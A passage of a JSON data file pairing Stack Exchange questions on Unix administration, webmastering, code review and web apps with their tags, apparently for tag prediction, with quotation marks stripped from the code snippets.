    "source": "How would I find uneven file permissions within a directory structure? <eos> How could I go about finding uneven file/directory permissions within a directory structure?  I've made some attempts at using the find command similar to:find /bin ! \\( -perm 777 -o -perm 776 -o -perm 775 -o -perm 774 -o -perm 773 -o -perm 772 -o -perm 771 -o -perm 770 -o -perm 760 -o -perm 750 -o -perm 740 -o -perm 730 -o -perm 720 -o -perm 710 -o -perm 700 -o -perm 600 -o -perm 500 -o -perm 400 but I run out of command line before I can complete the remaining permutations plus an -exec ls -lL {} \\;I've also been doing manual things similar to:ls -lL /bin | grep -v ^-rwxr-xr-x | grep -v ^-rwx--x--x | grep -v ^-rwsr-xr-x | grep -v ^-r-xr-xr-x | grep -v ^-rwxr-xr-t but again, I run out of command line before I can complete the remaining permutations.Both methods seem unusually awkward.  Is there a better, faster, easier way?  Note that I'm restricted in the shell I'm using (sh) and platform (Irix 6.5.22).",
    "target": "permissions;find;security;irix"
  },
  {
    "id": "_webmaster.78322",
    "source": "Why does Google Analytics show such a high percentage of traffic from Facebook as new users? <eos> I am a UX designer, and one of my clients had some questions for me about Google Analytics.  His organization has a Facebook page and uses some paid Facebook advertising.  The comments on many of his Facebook posts (which promote his new blog articles) come from his site's regular readers.Using a time scale in the past 30 days, Google Analytics is showing about 72% new users for his site.  In the same time period, about 65% of his traffic from Facebook is new users.  (If I shorten the time period to just yesterday, it's about 45% from Facebook and 63% from all sources.)  Since he expects most of his audience is regular readers, he would like to know: why would Google Analytics be showing so much of his audience as new?I told him that it's likely to be happening because of some combination of users using private browsing / Do Not Track and cookies not persisting between sessions.  But we would like to know if there are any other factors.",
    "target": "google analytics"
  },
  {
    "id": "_webapps.45376",
    "source": "Which set of response links should I use when responding to a meeting invitation in Gmail/Google Apps Email? <eos> When I receive an e-mail invitation via Google Apps, there are two places where it asks if I'm going, and I'm never sure which one to click (see screenshot).  Does it matter which one I click?  What's the difference, and why does it always ask twice?",
    "target": "gmail;google apps email"
  },
  {
    "id": "_unix.189782",
    "source": "putty does not allow me to input special chars <eos> I am having trouble accessing a folder with a very long name with  in its name.seems like every time I try to input  the putty window is not parsing the character successfully.Any ideas?",
    "target": "centos;putty"
  },
  {
    "id": "_webmaster.107844",
    "source": "How can I avoid site search page duplicate title tag error in pagination of site search? <eos> Google Search Console shows me my site search page duplicate Title Tag, ",
    "target": "google search console;web crawlers;webmaster"
  },
  {
    "id": "_codereview.20418",
    "source": "Counting seconds until auto-log-off <eos> I've just created a teeny little script to count the seconds until I get auto-logged off.  I already solved my issue with my ssh client settings, but I'd still like any help making the bash script nicer to read, or just tips in general.#!/bin/bashcount=0while ( [ : ] )do  count=$(($count+1))  n=${n:-0}  for i in `seq 0 $n`; do echo -en '\\b'; done  n=${#count}  echo -n $count  sleep 1done",
    "target": "bash"
  },
  {
    "id": "_unix.182743",
    "source": "Why do changes to /etc/passwd not take effect? <eos> I've edited /etc/passwd by running usermod -s to change my shell. (chsh doesn't work, because it prompts for a password; we SSH in using keys.)When I disconnect, and reconnect, the change doesn't take effect. I've restarted sshd too, and still nothing.",
    "target": "ssh;login"
  },
  {
    "id": "_webmaster.43705",
    "source": "How can I prevent Google from mixing different languages in my sitelinks? <eos> I have a web site in two different languages (English and Spanish).  It is indexed by Google but, when searched, sitelinks below my result appear mixed with Spanish and English subtitles.Each language is in a different folder (mydomain.com/en for pages in English and mydomain.com/es for pages in Spanish).Is there a way to help Google to distinguish between them?  The Spanish ones should show for the Spanish speakers and the English ones for the rest of users?",
    "target": "seo;google;search engines;sitelinks"
  },
  {
    "id": "_unix.280897",
    "source": "Process Scheduling Information Extraction <eos> I want to extract the process having highest utilization on each processor coreand then output its information (PID etc.) to a file. How can I do it by using either top or ps command?Thanks.",
    "target": "ps;top"
  },
  {
    "id": "_unix.345507",
    "source": "Log file and properties for shell script <eos> I have an java application that runs on windows and needs to be moved to linux. The executable for windows takes a config file as input which does a bunch of things like logging settings, classpaths, settings java path and other dependencies. In the config file, logging properties are set in this way: wrapper.logfile.format=LPTM  wrapper.logfile.loglevel=INFO    wrapper.syslog.loglevel=STATUSHow can this be achieved in the shell script that is going to execute the application? Also, is it possible to have a config file like such for the shell script as well?",
    "target": "shell script;logs"
  },
  {
    "id": "_codereview.111456",
    "source": "Sorting dictionary according to letter patterns <eos> I've written a JavaScript dictionary sorting algorithm, which takes a .txt file (the dictionary), and loads it via node's file system. The purpose of this algorithm is to sort every word into its corresponding array based on its letter pattern. For example, the word little would have the letter pattern of ABCCDE, and hello would have the letter pattern of ABCCD. The purpose of this sorting algorithm is to use it to decode substitution ciphers; however, this is the only working code I've written so far for it. This code works, and I have a sorted dictionary file here.However, I want to know how I might be able to improve this algorithm to make it as fast and efficient as possible. Even though its only run once, I want to get into the habit of writing efficient code. To break down exactly what's going on in the algorithm I've added a few comments, but to elaborate it loads each word from the dictionary and stores it in an array, in which I then iterate through the array and each letter of the word. The clpl variable starts at 'A', and it checks if it exists in a temp object. If it does, it adds that letter to the letter pattern, if it does not, it creates a new property on the object and assigns it the current letter as a value. It adds the assigned letter to lp, which is initialized as an empty string.The line clpl = String.fromCharCode(clpl.charCodeAt(0) + 1);gets the next letter. After it has iterated through each letter in the word, it checks if the current letter pattern exists in the sortedDictionary object, if it does it pushes it to an array containing all words with its letter pattern. If it does not, it creates a new array for that letter pattern and pushes the current word to that array. After it has gone through every word, it writes the sortedDictionary object to an external JSON file. //load file systemvar fs = require(fs);//load jsonfilevar jsonfile = require(jsonfile);//create var for dictionary filevar dictFile = american-english, sortedDictFile = sortedDictionary.json;//empty object to hold sorted dictionary according to letter patterns//empty dictionary array to hold wordsvar sortedDictionary = {}, dictionary = [];//declare variables for usevar temp, clpl, lp, word;console.time(Dictionary Sort);fs.readFile(dictFile, utf8, function(error, data){    if(error) throw error;    //push all words into an array     dictionary = data.toString().split(\\n);    for(var i = 0; i < dictionary.length; i++){        //set word to current word in dictionary        word = dictionary[i];        //set temp to empty object, clpl to A, and lp to an empty string        //this is used to get the current letter pattern        temp = {}, clpl = 'A', lp = '';        for(var j = 0; j < word.length; j++){            if(word[j] in temp){              lp += temp[word[j]];            } else {              temp[word[j]] = clpl;              lp += clpl;              clpl = String.fromCharCode(clpl.charCodeAt(0) + 1);            }        }        //if letter pattern of word exists in sorted dictionary        if(lp in sortedDictionary){            //add word to the array of words with same letter pattern            sortedDictionary[lp].push(word);        } else {            //if letter pattern is new, create new array to store words            sortedDictionary[lp] = [];            //add word to the array of words with same letter pattern            sortedDictionary[lp].push(word);        }    }    //write the sortedDictionary object to the sortedDictionary.json file    jsonfile.writeFile(sortedDictFile, sortedDictionary, {spaces: 2}, function(error){        if(error) throw error;    });    //time to sort and write to json file - Dictionary Sort: 687ms (137602 lines)    console.timeEnd(Dictionary Sort);});",
    "target": "javascript;node.js;cryptography"
  },
  {
    "id": "_unix.128852",
    "source": "encrypted ext3 damaged; how to proceed? <eos> My home partition on a Debian wheezy install is an encrypted LVM volume. It is ext3. Earlier today, I had a weird message in a terminal window about an attempt to write to a file in my /home tree failing due to having a read only file system. I rebooted and ended up with an error message saying /dev/sda1 is reported as clean. fsck.ext3, which runs automatically and reports that there is no such device as /dev/mapper/sda1_crypt and reports exit code 8. I get dropped to a maintenance  shell and told there was an attempt to write a log to /var/log/fsck/checkfs.That log reads:[Timestamp]fsck from util-linux 2.20.1/dev/mapper/sda1_crypt: Super blocks need_recovery flag is clear, but journal has data./dev/mapper/sda1_crypt: Run journal anyway/dev/mapper/sda1_crypt: UNEXPECTED INCONSISTENCY; RUN fsck MANUALLY     (i.e., without -a or -p options)fsck died with exit status 4I ran$ fsck -vnM /dev/mapper/sda1A bunch of illegal block #nnnn (mmmmmmmmm) in inode ppppppp IGNORED messages blew past, followed bytoo many blocks in Inode somenumberhereThen running additional passes to resolve blocks claimed by more than one inodeIt then outputPass 1B: Rescanning for multiply claimed blocksAfter a bit, I got a wall ofIllegal block number passed to ext2fs_test_block_bitmap somenumberhere for multiply claimed block mapThese were followed by 2 Multiply claimed blocks in I node anothernumber: [lists of 5 and 8 block numbers]Then I got a number of stanzas like[ 3828.181915] ata1.01: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0[ 3828.182462] ata1.01 BMDMA stat 0x64[ 3828.183810] ata1.01 failed command: READ DMA EXT[ 3828.185889] ata1.01 cmd 25/00:08:08:10:9c/00:00:29:00:00/f0 tag dma 4096 in[ 3828.185891] res 51/40:00:09:10:9c/40:00:29:00:00/f0 Emask 0x9 (media error)[ 3828.190071] ata1.01 status: { DRDY ERR }[ 3828.192153] ata1.01 status: { UNC }These were followed by[ 3830.509338] end_request: I/O error, deb SDA, sector 698093577[ 3830.509841] Buffer I/O error on device dm-3, logical block 87261184Error reading block 87261184 (Attempt to read block from filesystem resulted in short read) while reading I node and block bitmaps. Ignore error? nofsck.ext3: Can't read an block bitmap while retrying to read bitmaps for /dev/mappersfa1_crypt/dev/mapper/sda1_crypt: ******* WARNING: Filesystem still has errors *******e2fsck: aborted/dev/mapper/sda1_crypt: ******* WARNING: Filesystem still has errors *******And the it aborted with a warning that the filesystem still had errors.My questions are:Is my data toasted? (My rigorous backup policy hasn't been rigorously followed of late; I am being punished by the universe, I am sure.)What can/ought I to do now?Did I do the wrong thing already?Will someone hold me until the shaking stops?EDITI also asked on my local LUG mailing list. The advice I got there was to take an image of the drive with ddrescue and run fsck on a copy of that image. That seems sound and unlikely to make things worse. So, that is the present plan of attack, pending any better suggestions.",
    "target": "encryption;data recovery;fsck"
  },
  {
    "id": "_webapps.87199",
    "source": "Cognito Forms: dynamically displaying content entered into a repeating section on a subsequent page <eos> I'm creating a form where organizations can report on a number of different training positions which they provide.  These training positions are called 'posts'. On the first page of the form, users enter basic information about their posts, e.g. the 'post number'.  I've set this up as a repeating section, as one organization may have multiple posts.On the second page of the form, users need to enter more specific information relating to each of the posts they'd previously listed. Because of this, I'd like some of the information entered in the repeating section to be automatically populated here. For example, if a user lists three different posts in the repeating section on the first page, then the second page should display the details they entered for all three posts, with extra fields where they can provide further information for each.Essentially, I'm trying to dynamically create content and fields on one page based on what was entered in the repeating section on the previous page.  Is this possible?",
    "target": "cognito forms"
  },
  {
    "id": "_unix.370421",
    "source": "Why the lspci command does not list the serial ports? <eos> I have enabled two serial ports in VirtualBox, and then typed the lspci command in Ubuntu, and this is the result:The serial ports are not listed, is it because the serial ports are not part of the PCI bus?",
    "target": "linux;serial port;x86;pci"
  },
  {
    "id": "_webmaster.101400",
    "source": "SEO benefits of serving simplified pages to crawlers <eos> we're currently rebuilding a client's application and are wondering if there are any benefits of serving specific pages to crawlers?I.E. Semantic html, no stylesheets, additional meta tags?Would love to know what you think",
    "target": "seo;html;googlebot"
  },
  {
    "id": "_unix.349471",
    "source": "Logrotate in linux to handle log data loss <eos> We are using linux logrotate for rotating our log files,Example :/location/tomcat/logs/* /location/jboss/log/* {      copytruncate      daily      rotate 10      compress      size 20M      olddir rotated      create 0644 test test}As per the copy truncate definition given in LINUX,copytruncate          Truncate  the  original log file in place after creating a copy,          instead of moving the old log file and optionally creating a new          one,  It  can be used when some program can not be told to close          its logfile and thus might continue writing (appending)  to  the          previous log file forever.  Note that there is a very small time          slice between copying the file and truncating it, so  some  log-          ging  data  might be lost.  When this option is used, the create          option will have no effect, as the old log file stays in  place.So there will be a data loss in log file during rotate process. I noticed around 5 to 20 seconds of log loss, Is there a way / configuration to do the same process without data loss? ",
    "target": "logs;logrotate"
  },
  {
    "id": "_cs.49111",
    "source": "Union of right congruence relations <eos> Since we started talking about relations on languages and so on i keep on struggling with this subject. So now iam faced with two questions where i really dont know how to start. First of all, the natural relation of a language $L \\subseteq \\Sigma^*$ is the equivalence relation on $\\Sigma^*$ with the equivalence classes $L$ and $\\Sigma^* \\setminus L$Let the natural relations of two arbitrary languages $L_1$ and $L_2$ be right    congruent. Is the natural relation of the language $L_1 \\cup L_2 $ also right congruent?So a right congruence is a equivalence relation with the added property that:$ \\forall a \\in \\Sigma : u \\equiv v \\Longrightarrow ua \\equiv va$Intuitively i would say that the union of this two relations remains to be a  right congruence but i dont know how to prove this idea.For every equivalence relation $\\equiv$, there are at least two languages which are saturated by $\\equiv$, true or false? An equivalence relation saturates a Language $L$ if: $ u \\equiv v \\Longrightarrow u \\in L \\Leftrightarrow v \\in L $My guess would be that any equivalence relation saturates the Language $L$ and $\\bar{L}$I would be pleased if some one could provide me with a useful hint on how to solve this questions.",
    "target": "formal languages"
  },
  {
    "id": "_unix.353784",
    "source": "Is there anything that can be done via a console login, but not via an SSH login? <eos> Probably a stupid question but I want to be sure on this. On an SSH connection, can you do everything that you can do on a console connection?In other words, after launching a system and installing and configuring an SSH server on it, can you do all your further interaction with this system via SSH, and not use the console (except in cases that the SSH server is not available for some reason)?",
    "target": "ssh;console"
  },
  {
    "id": "_codereview.62059",
    "source": "Tiny Lua library to get char pointer from string <eos> BackgroundI'm using Lua with luaglut to do some OpenGL stuff. The luaglut API is almost identical to the gl/glut C APIs. Sometimes, gl functions want a pointer to some data, for example:glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, width, height, 0, GL_RGBA,    GL_UNSIGNED_BYTE, oh_crap_a_pointer)In these cases, the luaglut bindings take a light userdata containing the pointer. In the luaglut demos, a small example library called memarray does the work of setting up a C array and returning a pointer to it as a light userdata.You might use memarray something like this:require 'memarray'function loadTexture(filename)  local file = assert(io.open(filename, 'rb'))  local data = file:read('*a')  file:close()  local array = memarray('uchar', #data)  array:from_str(data)  return arrayend-- ... laterlocal texture = loadTexture('whatever.rgba')glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA,    GL_UNSIGNED_BYTE, texture:ptr())That got me thinking, why do we need memarray at all? Lua strings should be binary safe; all we really need is to get a pointer to the string returned fromfile:read('*a') as a light userdata. It would look something like this:function loadTexture(filename)  local file = assert(io.open(filename, 'rb'))  local data = file:read('*a')  file:close()  return dataend-- ... laterlocal stringpointer = require 'stringpointer'local texture = loadTexture('whatever.rgba')glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, 32, 32, 0, GL_RGBA,    GL_UNSIGNED_BYTE, stringpointer.get(texture))Of course we pass the string around instead of the pointer, because the GC could free the memory the string was in if there are no more references to it, invalidating the pointer. Internally Lua strings are immutable and passed by reference anyway, so this is no big deal.Code#include <lua.h>#include <lualib.h>#include <lauxlib.h>int get_pointer(lua_State *L){    luaL_checktype(L, 1, LUA_TSTRING);    lua_pushlightuserdata(L, (void *)lua_tostring(L, 1));    return 1;}int luaopen_stringpointer(lua_State *L){    const luaL_Reg api[] = {        {get, get_pointer},        {NULL, NULL}    };#if LUA_VERSION_NUM == 501    luaL_register(L, stringpointer, api);#else    luaL_newlib(L, api);#endif    return 1;}It's really tiny, but my C is rusty so maybe I did something stupid. It seems to work fine so far. Any input is welcome.",
    "target": "c;memory management;lua;opengl"
  },
  {
    "id": "_webmaster.12129",
    "source": "SEO - Crawl Errors <eos> I've been optimizing my website for search engines, and for some reason I have a crawl error on a page that has not been found at 'www.peach-designs.com/a' which is not a page, is not a link, or is not anything on my site.  I've checked my code and I'm only left to assume that this is a link to a page (a href, etc.).Is this common for other websites?",
    "target": "google;seo;web crawlers"
  },
  {
    "id": "_unix.51944",
    "source": "Is there a way to use curl interactively? Or is there an interactive curl/wget shell? <eos> Imagine something like this: $ curlsh http://www.example.org> GET /foo/bar/bam...output here...> POST /thing/pool ...... result here.... is there a tool that lets me do that? ",
    "target": "wget;curl"
  },
  {
    "id": "_unix.117040",
    "source": "removing spaces from first column <eos> My input file has positions in first column with different number of spaces (or no space)16504   16516           1650811   16520       1651   16524        16516111   16528        165204   16532       I need to get an output file where fist column has no spaces at all, while keeping second column as it is. 16504   16516       16508   16520     16512   16524      16516   16528       16520   16532   ",
    "target": "text processing;sed;awk;columns"
  },
  {
    "id": "_unix.364096",
    "source": "Pulse Audio plays 2% slower <eos> I have a problem with PulseAudio on my Buildroot based Raspberry Pi. It's playing audio 2% slower than normal. Indeed, after measurement, I get 100 BPM on the Raspberry when I have 102 on my computer, and it scales with the BPM. I always have RPi's BPM = 98% normal BPM .It also works with frequencies, that are 2% smaller ...I'm using a Raspberry Compute Module (CM1) with a Wolfson WM8731 audio codec.I tried everything I found on the internet to play files in real time, have the best scheduling priority, but still that problem. It's very strange because I don't hear the music cracking or whatever. I also don't hear 'vibrato' effect because of frequency changing regularly. So it really seems that Pulse Audio is just 2% late compared to real time.Do you guys have an idea of what could be the problem ?",
    "target": "audio;raspberry pi;pulseaudio"
  },
  {
    "id": "_unix.219564",
    "source": "install debian from hybrid standard CD <eos> I downloaded debian-live-8.1.0-i386-standard.isofrom http://cdimage.debian.org/debian-cd/8.1.0-live/i386/iso-hybrid/and booted a system from it , logged in with user and password as live. NOW, When i got bash prompt, now what to type so that the debian standard installation starts to install on my hard disk?background note: i downloaded all other .iso (for example: debian-live-8.1.0-i386-mate-desktop.iso  ) from the same above directory url. And from all those .iso,  i could run the system as live and install also - ie, they are hybrid CD.The standard iso works fine as live CD , but as it is hybrid CD too, so it should be able to start installation also.",
    "target": "debian"
  },
  {
    "id": "_unix.293327",
    "source": "How to determine if script is called by interactive shell or another script? <eos> It's fairly straightforward to determine from within a script that the code being run is not running in an interactive shell, but you already know that as you write the script, so I'm not sure how it's useful except within a function (or if you source the script).Within a script, how do you determine if the script is being run from an interactive shell, or being run by another script?  In other words, how do you determine the interactivity of the caller of the script?  Put yet another way, how do you know whether the parent shell is interactive or not?Just to further clarify, I'm not trying to find the name of the nearest interactive ancestor, I'm just trying to figure out if the immediate parent is interactive or not.If this varies from shell to shell, I'm most interested in zsh, but also in bash.",
    "target": "shell script;interactive"
  },
  {
    "id": "_webapps.20113",
    "source": "Is there a way I can clear votes in Trello? <eos> We're using Trello to track our hiring process.  It would be nice to use the vote feature to quickly gauge opinions without having to read comments.  However, there doesn't seem to be a way to clear votes besides having each member unvote.  So, votes currently must represent the card over the whole board.  It seems reasonable for it to represent the card only for that list, but that's only possible if you can clear it somehow...",
    "target": "trello"
  },
  {
    "id": "_softwareengineering.233498",
    "source": "Logging in a latency sensitive system <eos> Requirements:My application is latency sensitive. Millisecond level responsiveness matters. Not all the time, but when it acts, it needs to be fast.My application needs to log information about what it's done in those times.The actual writing of the logs does not need to be that fast, just the actions.However, the log files need to be written at human speed, in other words, I cannot set immediateFlush to false.So, obviously, certain kinds of logging are getting offloaded to another thread. I am using logback as a framework, but for certain sorts of log messages I still want to offload the work to another thread.Here is how the system currently works:Each part of the latency sensitive system gets a particular logger interface injected. Each of these log methods has a signature specific to the sorts of things I know the logger will need to log.A SimpleLogger implementation is written for each case. This writes to the log on the same thread.I have also written a ThreadedLogger which implements ALL the logging interfaces, and gets a backing logger implementation injected for each sort of logger.Whenever a log method is called in ThreadedLogger, it wraps the request in an SomeLogObject implements LogCommand, throws the objected into a LinkedBlockingQueue, and returns. This is similar to the Go4 Command patternThere is a consumption thread that blocks on BlockingQueue.take() waiting for log objects to come in. When they do, it calls LogCommand.execute(), which calls the appropriate method in the backing Logger in ThreadedLogger.Currently the LogCommand implementations are very stupid. They just call the appropriate method in the proper injected logger.I am trying to decide if I should refactor this system. Currently, if I need to create a new place to do these offloaded logs, I have to create:A new interfaceA new implementation of this interfaceTwo new DI bindings (one for the simple logger, one for the ThreadedLogger backer)A new LogCommand implementationA new method for creating this LogCommand objectCode for injecting and storing as a field the appropriate logger in ThreadedLogggerIt seems to me that it would be a lot simpler to offload the creation of the LogObject to the calling threads, but I am concerned that I'm exposing too much of the internal workings of the log system if I do that. Not that this is necessarily a problem, but it seems unclean. Another possibility would be to combine the functionality of the simple logger implementations with their respective log objects, so the objects change from being I am an object that does logging when given log data to I am a log event that knows how to log myself, and these objects can be created by a log factory.",
    "target": "java;design;logging"
  },
  {
    "id": "_datascience.20264",
    "source": "Feature extraction from given pcapng file <eos> The KDD 1999 dataset had 41 features and the UNB ISCX Intrusion Detection Evaluation DataSet (iscx.ca/dataset)had 49. For an intrusion detection problem, I want to extract these features from a given/generated pcapng file. Is there any feature extraction tool available for this? [All the information may not be present in the input pcapng file and some features may not be computable] ",
    "target": "feature extraction"
  },
  {
    "id": "_opensource.140",
    "source": "How can I keep a project from losing momentum? <eos> How can I keep people involved and motivated to work on a project that doesn't involve direct monetary benefit?What specific strategies do open source projects tend to use to keep core developers involved?Partly this is a general what strategies reliably motivate most open-source developers, but it's also about how can you prevent people from forgetting they're involved at all? What specific tactics do project leaders use to remind people that they're part of something?.At least in my own case, my largest problem with projects is that I have hundreds of barely started, and tens of half-finished things that I just completely forget about / put off, but that I do really want to see completed. While this arguably isn't specific to open source, to me at least it's the largest impediment.",
    "target": "project management;human resources"
  },
  {
    "id": "_softwareengineering.190876",
    "source": "I don't understand value iteration <eos> In class I am learning about value iteration and markov decision problems, we are doing through the UC Berkley pac-man project, so I am trying to write the value iterator for it and as I understand it, value iteration is that for each iteration you are visiting every state, and then tracking to a terminal state to get its value.I have a feeling I am not right, because when I try that in python I get a recursive depth exceed. So I return to the pseudo-code, and there is a Vk[s] and Vk-1[s'], which I had thought to mean value of state, and value of newState, but I must be missing something.So what is the significance of the k and k-1?My Code: def val(i, state):        if mdp.isTerminal(state) or i == 0:            return 0.0        actionCost = {}        for action in mdp.getPossibleActions(state):            actionCost[action] = 0            for (nextState, probability) in mdp.getTransitionStatesAndProbs(state, action):                reward = mdp.getReward(state, action, nextState)                actionCost[action] += probability * reward + discount * val(i - 1, nextState)                return actionCost[max(actionCost, key=actionCost.get)]    for i in range(iterations):        for state in mdp.getStates():              self.values[state] = val(i, state)Pseudo Code:k 0 repeat      k k+1       for each state s do           Vk[s] = maxa s' P(s'|s,a) (R(s,a,s')+ Vk-1[s']) until s |Vk[s]-Vk-1[s]| < ",
    "target": "python;artificial intelligence"
  },
  {
    "id": "_codereview.7725",
    "source": "Python xml schema parsing for simpleContent and simpleTypes <eos> I am writing a few python functions to parse through an xml schema for reuse later to check and create xml docs in this same pattern. Below are two functions I wrote to parse out data from simpleContent and simpleType objects. After writing this, it looked pretty messy to me and I'm sure there is a much better (more pythonic) way to write these functions and am looking for any assistance. I am use lxml for assess to the etree library.def get_simple_type(element):    simple_type = {}    ename = element.get(name)    simple_type[ename] = {}    simple_type[ename][restriction] = element.getchildren()[0].attrib    elements = element.getchildren()[0].getchildren()    simple_type[ename][elements] = []    for elem in elements:        simple_type[ename][elements].append(elem.get(value))    return simple_type  def get_simple_content(element):    simple_content = {}    simple_content[simpleContent] = {}    simple_content[simpleContent][extension] = element.getchildren()[0].attrib    simple_content[attributes] = []    attributes = element.getchildren()[0].getchildren()    for attribute in attributes:        simple_content[attributes].append(attribute.attrib)    return simple_contentExamples in the schema of simpleContent and simpleTypes (they will be consistently formatted so no need to make the code more extensible for the variety of ways these elements could be represented in a schema):<xs:simpleContent>    <xs:extension base=xs:integer>        <xs:attribute name=sort_order type=xs:integer />    </xs:extension></xs:simpleContent><xs:simpleType name=yesNoOption>    <xs:restriction base=xs:string>      <xs:enumeration value=yes/>      <xs:enumeration value=no/>      <xs:enumeration value=Yes/>      <xs:enumeration value=No/>    </xs:restriction></xs:simpleType>The code currently creates dictionaries like those show below, and I would like to keep that consistent:{'attributes': [{'type': 'xs:integer', 'name': 'sort_order'}], 'simpleContent': {'extension': {'base': 'xs:integer'}}}{'yesNoOption': {'restriction': {'base': 'xs:string'}, 'elements': ['yes', 'no', 'Yes', 'No']}}",
    "target": "python;parsing;xml"
  },
  {
    "id": "_softwareengineering.308749",
    "source": "Using MySql 5.7 JSON columns for EAV <eos> I am developing an e-commerce product and I have been able to implement all functionality and am left with allowing users to create additional attributes for a product. Right Now I have two options.EAVEAV is largely frowned upon but seems to work for Magento. But after researching all the headaches it causes I am a bit reluctant to use itUse JSON Columns in MySql 5.7This is rather new an I have not seen it being implemented anywhere else and I am dreading full table scans as a result of querying the JSON attributes. But after reading this MySql 5.7 JSON they seem to recommend using JSON. and it would be less tiresome than implementing something like this Practical MySql schema advice .My question is, although I am biased towards using the JSON column way of storing attributes as NoSQL is not an option for me, are there any drawbacks that are more severe than using EAV tables.",
    "target": "performance;sql;mysql"
  },
  {
    "id": "_codereview.18415",
    "source": "Stripping specified character <eos> Here's some code that removes the specified character, ch, from the string passed in. Is there a better way to do this? Specifically, one that's more efficient and/or portable?//returns string without any 'ch' characters in it, if any.#include <string>using namespace std;string strip(string str, const char ch){        size_t p = 0; //position of any 'ch'        while ((p = str.find(ch, p)) != string::npos)                str.erase(p, 1);        return str;}",
    "target": "c++"
  },
  {
    "id": "_codereview.167176",
    "source": "Stopwatch that uses the abstract factory design pattern <eos> I have wrote code for a stopwatch that utilizes the abstract design pattern and would like to get some feedback on the code, so be as harsh as you can.Note: I used ctime instead of chrono because this is not meant for benchmarking. The code will later be used in a console game, and the format of the std::tm struct is easy to work with.Also, note that the way I wrote the tests in source.cpp will result in a small visual bug from time to time to resolve it lower the waiting time inside of the do while loop from std::chrono::seconds(1) to std::chrono::milliseconds(250); and increase the value of timer, the following action will increase the refresh rate.EDIT: Note that this question is a followup to Watch that uses the abstract factory design pattern they both use the same Console, Constants and Digits library but both accomplish a different task StopWatch.h:#ifndef STOP_WATCH#define STOP_WATCH#includeDigits.h#include<vector>#include<memory>#include<ctime>class StopWatch{public:    virtual void printTime() = 0;    void setStopWatchXY(int x, int y);    bool countDownFrom(int seconds);    void updateTime();    void reset();    void start();    void stop();    void lap();    const std::vector<int>& getLapTimes() const;    int getElapsed() const;    virtual ~StopWatch() = default;protected:    int m_watchXPos;    int m_watchYPos;    int m_seconds;    int m_minutes;    int m_hours;private:    std::vector<int> m_lapTimes;    bool             m_running{ false };    int              m_elapsed{};    int              m_beg;    std::time_t      m_now;    void converter(int seconds);    void clearTime();};class DigitalStopWatch final : public StopWatch{public:    virtual void printTime() override;    explicit DigitalStopWatch(int x, int y)    {        setStopWatchXY(x, y);    }};class SegmentedStopWatch final : public StopWatch{public:    virtual void printTime() override;    explicit SegmentedStopWatch(int x, int y)    {        setStopWatchXY(x, y);    }private:    Digit m_stopWatchDigits[6];    void printDigitAtLoc(Digit digArr[], int index, int x, int y) const;    void printColon(int x, int y);    void printSeconds();    void printMinutes();    void printHours();    void set(Digit digArr[], int startIndex, int unit);    void setDigitsToCurrentTime();    void setSeconds();    void setMinutes();    void setHours();};class Factory{public:    virtual std::unique_ptr<StopWatch> createStopWatch(int stopWatchXPos = 0, int stopWatchYPos = 0) const = 0;};class DigitalStopWatchFactory final : public Factory{    virtual std::unique_ptr<StopWatch> createStopWatch(int stopWatchXPos = 0, int stopWatchYPos = 0) const override    {        return std::make_unique<DigitalStopWatch>(stopWatchXPos, stopWatchYPos);    }};class SegmentedStopWatchFactory final : public Factory{    virtual std::unique_ptr<StopWatch> createStopWatch(int stopWatchXPos = 0, int stopWatchYPos = 0) const override    {        return std::make_unique<SegmentedStopWatch>(stopWatchXPos, stopWatchYPos);    }};#endif   StopWatch.cpp:#includeStopWatch.h#includeConsole.h#include<thread> //for this_thread::sleep_fornamespace{    constexpr int maxTime          { 356400 };    constexpr int digitPadding     { 5 };    constexpr int secondsIndexStart{ 5 };    constexpr int minutesIndexStart{ 3 };    constexpr int timePadding      { 2 };    constexpr int hoursIndexStart  { 1 };    enum    {        First,        Second,        Third,        Fourth,        Fifth,        Sixth    };}/*|---STOP_WATCH_FUNCTIONS_START---|*//*|---PUBLIC_FUNCTIONS_START---|*/void StopWatch::setStopWatchXY(int x, int y){    Console::setXY(x, y, m_watchXPos, m_watchYPos);}bool StopWatch::countDownFrom(int seconds){    if (seconds > maxTime) seconds = maxTime;    while (seconds >= 0)    {        converter(seconds);        printTime();        if (seconds > 0)        {            std::this_thread::sleep_for(std::chrono::seconds(1));        }//end of if        --seconds;    }//end of while    return true;}void StopWatch::updateTime(){    long long curTimeInSec{ static_cast<long long>(std::time(&m_now)) - m_beg + m_elapsed };    if (curTimeInSec > maxTime) curTimeInSec = 0;    converter(curTimeInSec);}void StopWatch::reset(){    m_running = false;    m_lapTimes.clear();    m_lapTimes.shrink_to_fit();    clearTime();}void StopWatch::start(){    if (!m_running)    {        m_beg = static_cast<long long>(std::time(&m_now));        m_running = true;    }//end of if}void StopWatch::stop(){    if (m_running)    {        m_elapsed += static_cast<long long>(std::time(&m_now)) - m_beg;        m_running = false;    }//end of if}void StopWatch::lap(){    if (m_running)    {        stop();        m_lapTimes.emplace_back(m_elapsed);        clearTime();        start();    }//end of if}const std::vector<int>& StopWatch::getLapTimes() const{    return m_lapTimes;}int StopWatch::getElapsed() const{    return m_elapsed;}/*|----PUBLIC_FUNCTIONS_END----|*//*|---PRIVATE_FUNCTIONS_START---|*/void StopWatch::converter(int seconds){    m_hours   = seconds / 3600;    seconds   = seconds % 3600;    m_minutes = seconds / 60;    m_seconds = seconds % 60;}void StopWatch::clearTime(){    m_elapsed = 0;    m_seconds = 0;    m_minutes = 0;    m_hours   = 0;}/*|----PRIVATE_FUNCTIONS_END----|*//*|----STOP_WATCH_FUNCTIONS_END----|*//*|---DIGITAL_STOP_WATCH_FUNCTIONS_START---|*//*|---PUBLIC_FUNCTIONS_START---|*//*|---VIRTUAL_FUNCTIONS_START---|*/void DigitalStopWatch::printTime() {    Console::gotoxy(m_watchXPos, m_watchYPos);    if (m_hours < 10) std::cout << '0';    std::cout << m_hours << ':';    if (m_minutes < 10) std::cout << '0';    std::cout << m_minutes << ':';    if (m_seconds < 10) std::cout << '0';    std::cout << 